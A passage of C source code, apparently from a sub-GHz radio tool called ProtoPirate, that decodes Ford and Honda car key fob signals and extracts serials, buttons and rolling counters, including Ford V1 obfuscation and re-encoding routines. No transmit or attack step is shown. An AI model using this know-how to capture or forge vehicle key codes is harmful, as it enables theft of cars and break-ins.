    for(uint8_t i = 0; i < FORD_V2_KEY_BYTE_COUNT; i++) {
        instance->generic.data = (instance->generic.data << 8) | (uint64_t)k[i];
    }

    instance->generic.data_count_bit = FORD_V2_DATA_BITS;

    instance->extra_data = 0;
    for(uint8_t i = 0; i < FORD_V2_TAIL_RAW_BYTE_COUNT; i++) {
        instance->extra_data = (instance->extra_data << 8) | (uint64_t)k[8U + i];
    }
}

static bool ford_v2_decoder_commit_frame(PpDec_ford_v2* instance) {
    if(instance->raw_bytes[0] != FORD_V2_SYNC_0 || instance->raw_bytes[1] != FORD_V2_SYNC_1) {
        return false;
    }

    ford_v2_decoder_extract_from_raw(instance);

    if(!instance->structure_ok) {
        return false;
    }

    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }

    return true;
}

static void ford_v2_decoder_sync_enter_data(PpDec_ford_v2* instance) {
    memset(instance->raw_bytes, 0, sizeof(instance->raw_bytes));
    instance->raw_bytes[0] = FORD_V2_SYNC_0;
    instance->raw_bytes[1] = FORD_V2_SYNC_1;
    instance->byte_count = 2U;
    instance->decoder.parser_step = FordV2DecoderStepData;
    instance->decoder.decode_data = 0;
    instance->decoder.decode_count_bit = FORD_V2_POST_SYNC_DECODE_COUNT_BIT;
}

static bool
    ford_v2_decoder_sync_feed_event(PpDec_ford_v2* instance, ManchesterEvent event) {
    bool data_bit;

    if(!manchester_advance(
           instance->manchester_state, event, &instance->manchester_state, &data_bit)) {
        return false;
    }

    instance->sync_shift = (uint16_t)((instance->sync_shift << 1) | (data_bit ? 1U : 0U));
    if(instance->sync_bit_count < FORD_V2_SYNC_BITS) {
        instance->sync_bit_count++;
    }

    return instance->sync_bit_count >= FORD_V2_SYNC_BITS &&
           instance->sync_shift == ford_v2_sync_shift16_inv;
}

static void ford_v2_decoder_manchester_feed_event(
    PpDec_ford_v2* instance,
    ManchesterEvent event) {
    bool data_bit;

    if(instance->decoder.parser_step == FordV2DecoderStepSync) {
        if(ford_v2_decoder_sync_feed_event(instance, event)) {
            ford_v2_decoder_sync_enter_data(instance);
        }
        return;
    }

    if(!manchester_advance(
           instance->manchester_state, event, &instance->manchester_state, &data_bit)) {
        return;
    }

    if(instance->decoder.parser_step != FordV2DecoderStepData) {
        return;
    }

    data_bit = !data_bit;

    instance->decoder.decode_data = (instance->decoder.decode_data << 1) | (data_bit ? 1U : 0U);
    instance->decoder.decode_count_bit++;

    if((instance->decoder.decode_count_bit & 7U) == 0U) {
        uint8_t byte_val = (uint8_t)(instance->decoder.decode_data & 0xFFU);

        if(instance->byte_count < FORD_V2_DATA_BYTES) {
            instance->raw_bytes[instance->byte_count] = byte_val;
            instance->byte_count++;
        }

        instance->decoder.decode_data = 0;

        if(instance->byte_count == FORD_V2_DATA_BYTES) {
            (void)ford_v2_decoder_commit_frame(instance);
            ford_v2_decoder_reset_state(instance);
        }
    }
}

static bool ford_v2_decoder_manchester_feed_pulse(
    PpDec_ford_v2* instance,
    bool level,
    uint32_t duration) {
    if(ford_v2_duration_is_short(duration)) {
        ManchesterEvent ev = level ? ManchesterEventShortHigh : ManchesterEventShortLow;
        ford_v2_decoder_manchester_feed_event(instance, ev);
        return true;
    }

    if(ford_v2_duration_is_long(duration)) {
        ManchesterEvent ev = level ? ManchesterEventLongHigh : ManchesterEventLongLow;
        ford_v2_decoder_manchester_feed_event(instance, ev);
        return true;
    }

    return false;
}

static void ford_v2_decoder_enter_sync_from_preamble(
    PpDec_ford_v2* instance,
    bool level,
    uint32_t duration) {
    instance->decoder.parser_step = FordV2DecoderStepSync;
    instance->decoder.decode_data = 0;
    instance->decoder.decode_count_bit = 0;
    instance->byte_count = 0;
    instance->sync_shift = 0;
    instance->sync_bit_count = 0;
    memset(instance->raw_bytes, 0, sizeof(instance->raw_bytes));

    manchester_advance(
        instance->manchester_state, ManchesterEventReset, &instance->manchester_state, NULL);

    if(ford_v2_duration_is_short(duration)) {
        ManchesterEvent ev = level ? ManchesterEventShortHigh : ManchesterEventShortLow;
        if(ev == ManchesterEventShortLow || ev == ManchesterEventLongLow) {
            instance->manchester_state = ManchesterStateMid0;
        }
        ford_v2_decoder_manchester_feed_event(instance, ev);
    } else if(ford_v2_duration_is_long(duration)) {
        ManchesterEvent ev = level ? ManchesterEventLongHigh : ManchesterEventLongLow;
        if(ev == ManchesterEventShortLow || ev == ManchesterEventLongLow) {
            instance->manchester_state = ManchesterStateMid0;
        }
        ford_v2_decoder_manchester_feed_event(instance, ev);
    } else {
        ford_v2_decoder_reset_state(instance);
    }
}

static void* ford_v2_alloc() {
    PpDec_ford_v2* i = (PpDec_ford_v2*)calloc(1, sizeof(PpDec_ford_v2));
    if(!i) return NULL;
    i->generic.protocol_name = "Ford V2";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void ford_v2_reset(void* context) {
    PpDec_ford_v2* instance = (PpDec_ford_v2*)context;
    ford_v2_decoder_reset_state(instance);
}

static void ford_v2_feed(void* context, bool level, uint32_t duration) {
    PpDec_ford_v2* instance = (PpDec_ford_v2*)context;

    switch(instance->decoder.parser_step) {
    case FordV2DecoderStepReset:
        if(ford_v2_duration_is_short(duration)) {
            instance->preamble_count = 1U;
            instance->decoder.parser_step = FordV2DecoderStepPreamble;
        }
        break;

    case FordV2DecoderStepPreamble:
        if(ford_v2_duration_is_short(duration)) {
            if(instance->preamble_count < FORD_V2_PREAMBLE_COUNT_MAX) {
                instance->preamble_count++;
            }
        } else if(!level && ford_v2_duration_is_long(duration)) {
            if(instance->preamble_count >= FORD_V2_PREAMBLE_MIN) {
                ford_v2_decoder_enter_sync_from_preamble(instance, level, duration);
            } else {
                ford_v2_decoder_reset_state(instance);
            }
        } else {
            ford_v2_decoder_reset_state(instance);
        }
        break;

    case FordV2DecoderStepSync:
    case FordV2DecoderStepData:
        if(ford_v2_decoder_manchester_feed_pulse(instance, level, duration)) {
        } else {
            if(instance->decoder.parser_step == FordV2DecoderStepSync &&
               duration >= FORD_V2_INTER_BURST_GAP_US) {
                ford_v2_decoder_reset_state(instance);
                break;
            }
            if(instance->decoder.parser_step == FordV2DecoderStepSync) {
                ford_v2_decoder_reset_state(instance);
                break;
            }
            if(instance->decoder.parser_step == FordV2DecoderStepData) {
                if(duration >= FORD_V2_INTER_BURST_GAP_US) {
                    ford_v2_decoder_reset_state(instance);
                    break;
                }
            }
            ford_v2_decoder_reset_state(instance);
        }

        instance->decoder.te_last = duration;
        break;
    }
}

// =============================================================================
// Honda V1 — ProtoPirate (GPLv3)
// =============================================================================

#define HONDA_V1_BIT_COUNT            68
#define HONDA_V1_TE_SHORT             1000
#define HONDA_V1_TE_LONG              2000
#define HONDA_V1_TE_DELTA             400
#define HONDA_V1_TE_SHORT_MIN         600
#define HONDA_V1_TE_END               3500
#define HONDA_V1_VALID_MAX            0x4B
#define HONDA_V1_NIBBLE_MASK          0x0FU
#define HONDA_V1_SERIAL_MASK          0x0FFFFFFFU
#define HONDA_V1_COUNTER_MASK         0xFFFFU
#define HONDA_V1_LOW32_MASK           0xFFFFFFFFULL
#define HONDA_V1_BUTTON_MAX           10U
#define HONDA_V1_BUTTON_VALID_MASK    0x701U
#define HONDA_V1_DECODE_BUFFER_BYTES  12U

static const SubGhzBlockConst honda_v1_const = {
    .te_short = HONDA_V1_TE_SHORT,
    .te_long = HONDA_V1_TE_LONG,
    .te_delta = HONDA_V1_TE_DELTA,
    .min_count_bit_for_found = HONDA_V1_BIT_COUNT,
};

typedef enum {
    HondaV1DecoderStepReset = 0,
    HondaV1DecoderStepPreamble,
    HondaV1DecoderStepData,
} HondaV1DecoderStep;

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint8_t step;
    uint8_t preamble_count;
    bool preamble_has_long;
    bool data_pending;
    bool last_level;
    uint8_t bits[HONDA_V1_DECODE_BUFFER_BYTES];
    uint8_t bit_count;
    uint32_t pending;
    bool pending_valid;
    uint8_t k2;
} PpDec_honda_v1;

static bool honda_v1_button_valid(uint8_t b) {
    if(b > HONDA_V1_BUTTON_MAX) return false;
    return ((HONDA_V1_BUTTON_VALID_MASK >> b) & 1U) != 0U;
}

static bool honda_v1_duration_is(uint32_t d, uint32_t t) {
    return (d >= t) ? ((d - t) <= HONDA_V1_TE_DELTA) : ((t - d) <= HONDA_V1_TE_DELTA);
}

static void honda_v1_decode_fields(SubGhzBlockGeneric* generic) {
    const uint32_t low = (uint32_t)(generic->data & HONDA_V1_LOW32_MASK);

    generic->serial = (uint32_t)((generic->data >> 36U) & HONDA_V1_SERIAL_MASK);
    generic->btn = (uint8_t)((low >> 28U) & HONDA_V1_NIBBLE_MASK);
    generic->cnt = low & HONDA_V1_COUNTER_MASK;
    generic->data_count_bit = HONDA_V1_BIT_COUNT;
}

static void honda_v1_state_reset(PpDec_honda_v1* instance) {
    instance->step = HondaV1DecoderStepReset;
    instance->preamble_count = 0U;
    instance->preamble_has_long = false;
    instance->data_pending = false;
    instance->last_level = false;
    instance->bit_count = 0U;
    memset(instance->bits, 0, sizeof(instance->bits));
}

static void honda_v1_add_bit(PpDec_honda_v1* instance, bool bit) {
    if(instance->bit_count > HONDA_V1_VALID_MAX) return;
    if(bit) {
        instance->bits[instance->bit_count >> 3U] |=
            (uint8_t)(1U << (((uint8_t)~instance->bit_count) & 0x07U));
    }
    instance->bit_count++;
}

static bool honda_v1_commit(PpDec_honda_v1* instance) {
    if(instance->bit_count < HONDA_V1_BIT_COUNT) return false;

    uint8_t aligned[sizeof(instance->bits)];
    memcpy(aligned, instance->bits, sizeof(aligned));

    uint8_t shift_count = instance->bit_count - HONDA_V1_BIT_COUNT;
    if(shift_count < 1U) shift_count = 1U;

    for(uint8_t shift = 0U; shift < shift_count; shift++) {
        for(size_t i = 0; i < sizeof(aligned) - 1U; i++) {
            aligned[i] = (uint8_t)((aligned[i] << 1U) | (aligned[i + 1U] >> 7U));
        }
        aligned[sizeof(aligned) - 1U] <<= 1U;
    }

    const uint8_t button = (uint8_t)(aligned[4] >> 4U);
    if(!honda_v1_button_valid(button)) return false;

    instance->generic.data = pp_bytes_to_u64_be(aligned);
    instance->k2 = (uint8_t)(aligned[8] >> 4U);
    honda_v1_decode_fields(&instance->generic);

    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }

    return true;
}

static void
    honda_v1_symbol(PpDec_honda_v1* instance, bool level, uint32_t duration) {
    const bool sh = honda_v1_duration_is(duration, HONDA_V1_TE_SHORT);
    const bool lg = honda_v1_duration_is(duration, HONDA_V1_TE_LONG);

    if(!sh && !lg) {
        if(!level && (duration > HONDA_V1_TE_END) && (instance->step == HondaV1DecoderStepData)) {
            honda_v1_commit(instance);
        }
        honda_v1_state_reset(instance);
        return;
    }

    if(instance->step == HondaV1DecoderStepReset) {
        if(level) {
            instance->step = HondaV1DecoderStepPreamble;
            instance->preamble_count = 1U;
            instance->last_level = level;
        }
        return;
    }

    if(instance->step == HondaV1DecoderStepPreamble) {
        if(lg) {
            if(instance->preamble_count < 0xFFU) instance->preamble_count++;
            instance->preamble_has_long = true;
            instance->last_level = level;
            return;
        }

        if(sh) {
            if(instance->preamble_has_long && (instance->preamble_count > 5U)) {
                instance->step = HondaV1DecoderStepData;
                instance->bit_count = 0U;
                memset(instance->bits, 0, sizeof(instance->bits));
                instance->data_pending = true;
                instance->last_level = level;
                return;
            }

            if(instance->preamble_count < 0xFFU) instance->preamble_count++;
            instance->last_level = level;
            return;
        }

        honda_v1_state_reset(instance);
        return;
    }

    if(sh) {
        if(instance->data_pending) {
            honda_v1_add_bit(instance, level);
            instance->data_pending = false;
            instance->last_level = level;
            return;
        }

        instance->data_pending = true;
        instance->last_level = level;
    } else {
        if(instance->data_pending) {
            honda_v1_add_bit(instance, level);
        } else {
            honda_v1_add_bit(instance, instance->last_level);
        }

        instance->last_level = level;
    }
}

static void* honda_v1_alloc() {
    PpDec_honda_v1* i = (PpDec_honda_v1*)calloc(1, sizeof(PpDec_honda_v1));
    if(!i) return NULL;
    i->generic.protocol_name = "Honda V1";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void honda_v1_reset(void* context) {
    PpDec_honda_v1* instance = (PpDec_honda_v1*)context;
    instance->pending = 0U;
    instance->pending_valid = false;
    honda_v1_state_reset(instance);
}

static void honda_v1_feed(void* context, bool level, uint32_t duration) {
    PpDec_honda_v1* instance = (PpDec_honda_v1*)context;

    if(duration < HONDA_V1_TE_DELTA) {
        instance->pending += duration;
        instance->pending_valid = true;
        return;
    }

    if(instance->pending_valid) {
        const uint32_t p = instance->pending;
        if(level) {
            instance->pending = p + duration;
            instance->pending_valid = true;
            return;
        }
        if(p >= HONDA_V1_TE_SHORT_MIN) honda_v1_symbol(instance, true, p);
        instance->pending = 0U;
        instance->pending_valid = false;
    }

    if(level) {
        instance->pending = duration;
        instance->pending_valid = true;
        return;
    }

    honda_v1_symbol(instance, false, duration);
}

// =============================================================================
// Honda Static — ProtoPirate (GPLv3)
// =============================================================================

#define HONDA_STATIC_BIT_COUNT       64
#define HONDA_STATIC_MIN_SYMBOLS     36
#define HONDA_STATIC_SHORT_BASE_US   28
#define HONDA_STATIC_SHORT_SPAN_US   70
#define HONDA_STATIC_LONG_BASE_US    61
#define HONDA_STATIC_LONG_SPAN_US    130
#define HONDA_STATIC_SYMBOL_CAPACITY            512
#define HONDA_STATIC_PREAMBLE_MAX_TRANSITIONS   19
#define HONDA_STATIC_SYMBOL_BYTE_COUNT          ((HONDA_STATIC_SYMBOL_CAPACITY + 7U) / 8U)

static const SubGhzBlockConst honda_static_const = {
    .te_short = HONDA_STATIC_SHORT_BASE_US,
    .te_long = HONDA_STATIC_LONG_BASE_US,
    .te_delta = 0,
    .min_count_bit_for_found = HONDA_STATIC_BIT_COUNT,
};

typedef struct {
    uint8_t button;
    uint32_t serial;
    uint32_t counter;
    uint8_t checksum;
} HondaStaticFields;

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint8_t symbols[HONDA_STATIC_SYMBOL_BYTE_COUNT];
    uint16_t symbols_count;
} PpDec_honda_static;

static void honda_static_decoder_commit(
    PpDec_honda_static* instance,
    const HondaStaticFields* decoded);

static uint8_t honda_static_get_bits(const uint8_t* data, uint8_t start, uint8_t count) {
    uint32_t value = 0;

    for(uint8_t i = 0; i < count; i++) {
        const uint8_t bit_index = start + i;
        const uint8_t byte = data[bit_index >> 3U];
        const uint8_t shift = (uint8_t)(~bit_index) & 0x07U;
        value = (value << 1U) | ((byte >> shift) & 1U);
    }

    return (uint8_t)value;
}

static uint32_t honda_static_get_bits_u32(const uint8_t* data, uint8_t start, uint8_t count) {
    uint32_t value = 0;

    for(uint8_t i = 0; i < count; i++) {
        const uint8_t bit_index = start + i;
        const uint8_t byte = data[bit_index >> 3U];
        const uint8_t shift = (uint8_t)(~bit_index) & 0x07U;
        value = (value << 1U) | ((byte >> shift) & 1U);
    }

    return value;
}

static uint8_t honda_static_level_u8(bool level) {
    return level ? 1U : 0U;
}

static void honda_static_symbol_set(uint8_t* buf, uint16_t index, uint8_t v) {
    const uint8_t byte_index = (uint8_t)(index >> 3U);
    const uint8_t shift = (uint8_t)(~index) & 0x07U;
    const uint8_t mask = (uint8_t)(1U << shift);
    if(v) {
        buf[byte_index] |= mask;
    } else {
        buf[byte_index] &= (uint8_t)~mask;
    }
}

static uint8_t honda_static_symbol_get(const uint8_t* buf, uint16_t index) {
    const uint8_t byte_index = (uint8_t)(index >> 3U);
    const uint8_t shift = (uint8_t)(~index) & 0x07U;
    return (uint8_t)((buf[byte_index] >> shift) & 1U);
}

static bool honda_static_is_valid_button(uint8_t button) {
    if(button > 9U) {
        return false;
    }

    return ((0x336U >> button) & 1U) != 0U;
}

static bool honda_static_is_valid_serial(uint32_t serial) {
    return (serial != 0U) && (serial != 0x0FFFFFFFU);
}

static uint64_t honda_static_pack_compact(const HondaStaticFields* fields) {
    uint8_t compact[8];

    compact[0] = fields->button & 0x0FU;
    compact[1] = (uint8_t)(fields->serial >> 20U);
    compact[2] = (uint8_t)(fields->serial >> 12U);
    compact[3] = (uint8_t)(fields->serial >> 4U);
    compact[4] = (uint8_t)(fields->serial << 4U);
    compact[5] = (uint8_t)(fields->counter >> 16U);
    compact[6] = (uint8_t)(fields->counter >> 8U);
    compact[7] = (uint8_t)fields->counter;

    return pp_bytes_to_u64_be(compact);
}

static bool
    honda_static_validate_forward_packet(const uint8_t packet[9], HondaStaticFields* fields) {
    const uint8_t button = honda_static_get_bits(packet, 0, 4);
    const uint32_t serial = honda_static_get_bits_u32(packet, 4, 28);
    const uint32_t counter = honda_static_get_bits_u32(packet, 32, 24);
    const uint8_t checksum = honda_static_get_bits(packet, 56, 8);

    uint8_t checksum_calc = 0U;
    for(size_t i = 0; i < 7; i++) {
        checksum_calc ^= packet[i];
    }

    if(checksum != checksum_calc) {
        return false;
    }
    if(!honda_static_is_valid_button(button)) {
        return false;
    }
    if(!honda_static_is_valid_serial(serial)) {
        return false;
    }

    fields->button = button;
    fields->serial = serial;
    fields->counter = counter;
    fields->checksum = checksum;

    return true;
}

static bool
    honda_static_validate_reverse_packet(const uint8_t packet[9], HondaStaticFields* fields) {
    uint8_t reversed[9];
    for(size_t i = 0; i < sizeof(reversed); i++) {
        reversed[i] = pp_reverse_bits8(packet[i]);
    }

    const uint8_t button = honda_static_get_bits(reversed, 0, 4);
    const uint32_t serial = honda_static_get_bits_u32(reversed, 4, 28);
    const uint32_t counter = honda_static_get_bits_u32(reversed, 32, 24);

    uint8_t checksum = 0U;
    for(size_t i = 0; i < 7; i++) {
        checksum ^= reversed[i];
    }

    if(!honda_static_is_valid_button(button)) {
        return false;
    }
    if(!honda_static_is_valid_serial(serial)) {
        return false;
    }

    fields->button = button;
    fields->serial = serial;
    fields->counter = counter;
    fields->checksum = checksum;

    return true;
}

static bool honda_static_manchester_pack_64(
    const uint8_t* symbol_bits,
    uint16_t count,
    uint16_t start_pos,
    bool inverted,
    uint8_t packet[9],
    uint16_t* out_bit_count) {
    memset(packet, 0, 9);

    uint16_t pos = start_pos;
    uint16_t bit_count = 0U;

    while((uint16_t)(pos + 1U) < count) {
        if(bit_count >= HONDA_STATIC_BIT_COUNT) {
            break;
        }

        const uint8_t a = honda_static_symbol_get(symbol_bits, pos);
        const uint8_t b = honda_static_symbol_get(symbol_bits, pos + 1U);

        if(a == b) {
            pos++;
            continue;
        }

        bool bit = false;
        if(inverted) {
            bit = (a == 0U) && (b == 1U);
        } else {
            bit = (a == 1U) && (b == 0U);
        }

        if(bit) {
            packet[bit_count >> 3U] |= (uint8_t)(1U << (((uint8_t)~bit_count) & 0x07U));
        }

        bit_count++;
        pos += 2U;
    }

    if(out_bit_count) {
        *out_bit_count = bit_count;
    }

    return bit_count >= HONDA_STATIC_BIT_COUNT;
}

static bool honda_static_parse_symbols(PpDec_honda_static* instance, bool inverted) {
    const uint16_t count = instance->symbols_count;
    const uint8_t* symbol_bits = instance->symbols;
    HondaStaticFields decoded;

    uint16_t index = 1U;
    uint16_t transitions = 0U;

    while(index < count) {
        if(honda_static_symbol_get(symbol_bits, index) !=
           honda_static_symbol_get(symbol_bits, index - 1U)) {
            transitions++;
        } else {
            if(transitions > HONDA_STATIC_PREAMBLE_MAX_TRANSITIONS) {
                break;
            }
            transitions = 0U;
        }
        index++;
    }

    if(index >= count) {
        return false;
    }

    while(((uint16_t)(index + 1U) < count) && (honda_static_symbol_get(symbol_bits, index) ==
                                               honda_static_symbol_get(symbol_bits, index + 1U))) {
        index++;
    }

    const uint16_t data_start = index;

    uint8_t packet[9] = {0};
    uint16_t bit_count = 0U;

    if(!honda_static_manchester_pack_64(
           symbol_bits, count, data_start, inverted, packet, &bit_count)) {
        return false;
    }

    if(honda_static_validate_forward_packet(packet, &decoded)) {
        honda_static_decoder_commit(instance, &decoded);
        return true;
    }

    if(inverted) {
        return false;
    }

    if(honda_static_validate_reverse_packet(packet, &decoded)) {
        honda_static_decoder_commit(instance, &decoded);
        return true;
    }

    return false;
}

static void honda_static_decoder_commit(
    PpDec_honda_static* instance,
    const HondaStaticFields* decoded) {
    instance->generic.data_count_bit = HONDA_STATIC_BIT_COUNT;
    instance->generic.data = honda_static_pack_compact(decoded);
    instance->generic.serial = decoded->serial;
    instance->generic.cnt = decoded->counter;
    instance->generic.btn = decoded->button;

    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }
}

static void* honda_static_alloc() {
    PpDec_honda_static* i = (PpDec_honda_static*)calloc(1, sizeof(PpDec_honda_static));
    if(!i) return NULL;
    i->generic.protocol_name = "Honda Static";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void honda_static_reset(void* context) {
    PpDec_honda_static* instance = (PpDec_honda_static*)context;
    instance->symbols_count = 0U;
}

static void honda_static_feed(void* context, bool level, uint32_t duration) {
    PpDec_honda_static* instance = (PpDec_honda_static*)context;

    const uint8_t sym = honda_static_level_u8(level);

    if((duration >= HONDA_STATIC_SHORT_BASE_US) &&
       ((duration - HONDA_STATIC_SHORT_BASE_US) <= HONDA_STATIC_SHORT_SPAN_US)) {
        if(instance->symbols_count < HONDA_STATIC_SYMBOL_CAPACITY) {
            honda_static_symbol_set(instance->symbols, instance->symbols_count, sym);
            instance->symbols_count++;
        }
        return;
    }

    if((duration >= HONDA_STATIC_LONG_BASE_US) &&
       ((duration - HONDA_STATIC_LONG_BASE_US) <= HONDA_STATIC_LONG_SPAN_US)) {
        if((uint16_t)(instance->symbols_count + 2U) <= HONDA_STATIC_SYMBOL_CAPACITY) {
            honda_static_symbol_set(instance->symbols, instance->symbols_count, sym);
            instance->symbols_count++;
            honda_static_symbol_set(instance->symbols, instance->symbols_count, sym);
            instance->symbols_count++;
        }
        return;
    }

    const uint16_t sc = instance->symbols_count;

    if(sc >= HONDA_STATIC_MIN_SYMBOLS) {
        if(!honda_static_parse_symbols(instance, true)) {
            honda_static_parse_symbols(instance, false);
        }
    }

    instance->symbols_count = 0U;
}

// =============================================================================
// Ford V1 — ProtoPirate (GPLv3)
// =============================================================================

static const SubGhzBlockConst ford_v1_const = {
    .te_short = 65,
    .te_long = 130,
    .te_delta = 39,
    .min_count_bit_for_found = 136,
};

#define FORD_V1_DELTA_LONG        40U
#define FORD_V1_DELTA_DATASYNC    39U
#define FORD_V1_SILENCE_LONG_MULT 3U
#define FORD_V1_PREAMBLE_MIN      50
#define FORD_V1_DATA_BITS         136
#define FORD_V1_DATA_BYTES        17

#define ford_v1_crc16(data, len) subghz_protocol_blocks_crc16((data), (len), 0x1021, 0x0000)

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint32_t crc_calc;

    uint64_t data2;

    uint8_t raw_bytes[FORD_V1_DATA_BYTES + 1];
    uint8_t byte_count;

    ManchesterState manchester_state;
    uint16_t preamble_count;

    uint8_t sync_event_idx;
    uint8_t sync_event_count;
    uint8_t sync_events[8];

    uint8_t encryption_supported;
} PpDec_ford_v1;

typedef enum {
    FordV1DecoderStepReset = 0,
    FordV1DecoderStepPreamble = 1,
    FordV1DecoderStepSync = 2,
    FordV1DecoderStepData = 3,
} FordV1DecoderStep;

static void ford_v1_reset(void* context);

static void ford_v1_decode_with_flag(uint8_t* raw, size_t len, uint8_t flag_byte) {
    if(len < 9) return;

    if(flag_byte) {
        uint8_t xor_byte = raw[7];
        for(int i = 1; i < 7; i++) {
            raw[i] ^= xor_byte;
        }
    } else {
        uint8_t xor_byte = raw[6];
        for(int i = 1; i < 6; i++) {
            raw[i] ^= xor_byte;
        }
        raw[7] ^= xor_byte;
    }

    uint8_t b6 = raw[6];
    uint8_t b7 = raw[7];
    raw[6] = (b6 & 0xAA) | (b7 & 0x55);
    raw[7] = (b7 & 0xAA) | (b6 & 0x55);
}

static void ford_v1_decode(uint8_t* raw, size_t len) {
    if(len < 9) return;

    uint8_t endbyte = raw[8];
    uint8_t parity_any = (endbyte != 0) ? 1 : 0;
    uint8_t parity = 0;
    uint8_t tmp = endbyte;
    while(tmp) {
        parity ^= (tmp & 1);
        tmp >>= 1;
    }

    uint8_t flag_byte = parity_any ? parity : 0;
    ford_v1_decode_with_flag(raw, len, flag_byte);
}

static void ford_v1_encode_inverse_block(uint8_t block[9]) {
    uint8_t sum = 0;
    for(size_t i = 1; i <= 7; i++) {
        sum = (uint8_t)(sum + block[i]);
    }

    const uint8_t p6 = block[6];
    const uint8_t p7 = block[7];
    const uint8_t post6 = (uint8_t)((p6 & 0xAAU) | (p7 & 0x55U));
    const uint8_t post7 = (uint8_t)((p7 & 0xAAU) | (p6 & 0x55U));
    const uint8_t xorv = (uint8_t)(post6 ^ post7);

    uint8_t xor_byte;
    if((__builtin_popcount((unsigned int)sum) & 1) != 0) {
        block[6] = xorv;
        block[7] = post7;
        xor_byte = post7;
    } else {
        block[6] = post6;
        block[7] = xorv;
        xor_byte = post6;
    }

    for(size_t i = 1; i <= 5; i++) {
        block[i] ^= xor_byte;
    }
}

static void ford_v1_encode_air_9bytes(const uint8_t* plain9, uint8_t* air9_out) {
    uint8_t block[9];
    memcpy(block, plain9, 9);
    ford_v1_encode_inverse_block(block);
    memcpy(air9_out, block, 9);
}

static bool ford_v1_plain_from_air(const uint8_t air9[9], uint8_t plain9_out[9]) {
    for(uint8_t flag = 0; flag < 2; flag++) {
        uint8_t cand[9];
        memcpy(cand, air9, 9);
        ford_v1_decode_with_flag(cand, 9, flag);
        uint8_t reair[9];
        ford_v1_encode_air_9bytes(cand, reair);
        if(memcmp(reair, air9, 9) == 0) {
            memcpy(plain9_out, cand, 9);
            return true;
        }
    }
    return false;
}

static void ford_v1_fields_from_plain(
    const uint8_t plain9[9],
    uint32_t* serial_out,
    uint8_t* btn_out,
    uint32_t* cnt_out) {
    *serial_out = ((uint32_t)plain9[1] << 24) | ((uint32_t)plain9[2] << 16) |
                  ((uint32_t)plain9[3] << 8) | plain9[0];
    *btn_out = (plain9[5] >> 4) & 0x0F;
    *cnt_out = ((plain9[5] & 0x0F) << 16) | (plain9[6] << 8) | plain9[7];
}

static bool ford_v1_process_data(PpDec_ford_v1* instance) {
    uint8_t* raw = instance->raw_bytes;
    uint8_t orig[FORD_V1_DATA_BYTES];
    memcpy(orig, raw, FORD_V1_DATA_BYTES);

    FURI_LOG_D(
        TAG,
        "process_data: raw=%02X %02X %02X %02X %02X %02X %02X %02X %02X",
        raw[0],
        raw[1],
        raw[2],
        raw[3],
        raw[4],
        raw[5],
        raw[6],
        raw[7],
        raw[8]);

    uint16_t calc_crc = ford_v1_crc16(&raw[3], 12);
    uint16_t recv_crc = ((uint16_t)raw[15] << 8) | raw[16];

    if(recv_crc != calc_crc) {
        memcpy(raw, orig, FORD_V1_DATA_BYTES);
        for(size_t i = 0; i < FORD_V1_DATA_BYTES; i++) {
            raw[i] = ~raw[i];
        }
        calc_crc = ford_v1_crc16(&raw[3], 12);
        recv_crc = ((uint16_t)raw[15] << 8) | raw[16];
    }

    if(recv_crc != calc_crc) {
        return false;
    }

    const uint8_t* const air9 = &raw[6];
    uint8_t decoded[9];
    bool strict_ok = false;
    bool rolling_ok = false;

    uint8_t decoded_b0[9];
    uint8_t decoded_b1[9];
    memcpy(decoded_b0, air9, 9);
    ford_v1_decode_with_flag(decoded_b0, 9, 0);
    memcpy(decoded_b1, air9, 9);
    ford_v1_decode_with_flag(decoded_b1, 9, 1);

    if((decoded_b0[3] == raw[5]) && (decoded_b0[4] == raw[6])) {
        memcpy(decoded, decoded_b0, 9);
        strict_ok = true;
    } else if((decoded_b1[3] == raw[5]) && (decoded_b1[4] == raw[6])) {
        memcpy(decoded, decoded_b1, 9);
        strict_ok = true;
    } else if(ford_v1_plain_from_air(air9, decoded)) {
        rolling_ok = true;
    } else {
        memcpy(decoded, air9, 9);
        ford_v1_decode(decoded, 9);
    }

    uint16_t recalc_crc = ford_v1_crc16(&raw[3], 12);
    instance->crc_calc = recalc_crc;

    uint64_t key1 = 0;
    for(int i = 0; i < 7; i++) {
        key1 = (key1 << 8) | raw[0 + i];
    }

    uint64_t key2 = 0;
    for(int i = 0; i < 8; i++) {
        key2 = (key2 << 8) | raw[7 + i];
    }

    instance->generic.data = key1;
    instance->data2 = key2;
    instance->generic.data_count_bit = FORD_V1_DATA_BITS;

    if(strict_ok) {
        // Shim's SubGhzBlockGeneric.cnt is uint16_t; route the uint32_t* out-param
        // through a temporary so the pointer types match.
        uint32_t cnt_tmp = instance->generic.cnt;
        ford_v1_fields_from_plain(
            decoded, &instance->generic.serial, &instance->generic.btn, &cnt_tmp);
        instance->generic.cnt = (uint16_t)cnt_tmp;
        instance->encryption_supported = 1;
    } else {
        instance->generic.serial = ((uint32_t)raw[3] << 24) | ((uint32_t)raw[4] << 16) |
                                   ((uint32_t)raw[5] << 8) | raw[6];
        instance->generic.btn = 0;
        instance->generic.cnt = 0;
        instance->encryption_supported = 0;
        (void)rolling_ok;
    }

    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }

    return true;
}

static bool ford_v1_try_last_byte_variants(PpDec_ford_v1* instance) {
    if(instance->byte_count != 16U) {
        ford_v1_reset(instance);
        return false;
    }

    if((uint8_t)(instance->decoder.decode_count_bit + 0x7AU) > 1U) {
        ford_v1_reset(instance);
        return false;
    }

    const uint8_t shift = (uint8_t)(FORD_V1_DATA_BITS - instance->decoder.decode_count_bit);
    const uint8_t variants = (uint8_t)(1U << shift);
    uint8_t saved[16];
    memcpy(saved, instance->raw_bytes, sizeof(saved));
    const uint32_t partial = instance->decoder.decode_data;

    for(uint8_t variant = 0; variant < variants; variant++) {
